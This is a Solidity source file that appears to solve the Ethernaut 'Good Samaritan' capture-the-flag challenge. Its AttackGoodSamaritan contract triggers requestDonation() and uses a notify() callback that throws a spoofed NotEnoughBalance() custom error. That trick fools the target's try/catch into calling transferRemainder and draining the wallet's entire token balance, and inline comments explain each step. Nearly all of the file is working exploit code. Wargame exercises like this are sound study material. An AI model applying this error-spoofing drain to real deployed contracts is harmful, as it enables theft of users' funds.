// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
  function requestDonation() external returns(bool enoughBalance);
}

// import "./GoodSamaritan.sol";


contract AttackGoodSamaritan {

  error NotEnoughBalance();

  IGoodSamaritan goodSamaritan;

  constructor(address _goodSamaritan) {
    goodSamaritan = IGoodSamaritan(_goodSamaritan);
  }

  
  function initiateAttack() public {
    goodSamaritan.requestDonation();
  }

  // function initiateAttack(address _goodSamaritan) public {
  //   GoodSamaritan(_goodSamaritan).requestDonation();
  // }


  // @audit-info => In theory, when this function is called, it must throw the NotEnoughBalance() custom error, thus, causing the error to bubble up all the way up to the requestDonation() function on the GoodSamaritan contract
  // And because there is a try-catch to handle errors, the catch block code should be executed and the keccak256(err) of this error must match the keccak256(abi.encodeWithSignature("NotEnoughBalance()")), thus, proceeding to call the function wallet.transferRemainder(msg.sender)
  
  // @audit => wallet.transferRemainder(msg.sender) should be executed only when the Wallet contract has less than 10 coins, but we are tricking the requestDonation() to call transferRemainder() even though the Wallet has all the tokens!

  // @audit-ok => notify() will be called exactly two times:
    // - The first time it will be called by the wallet.donate10() function on the GoodSamaritan, and the trick here is to revert this called with the exact same CustomError that the catch code will use to determine if the wallet can send all the remaining balance
    // - The second call will be made once the catch code is tricked and calls the wallet.transferRemainder(msg.sender) function, as part of the execution of the transferRemainder() function this method (notify()) will be called again!
        // - The trick here is to ensure that the second call won't be reverted, because that second call is the call that is transfering all the tokens out of the Wallet contract!
  function notify(uint256 amount) external pure {
    if(amount <= 10) {
      revert NotEnoughBalance();
    }
  }


}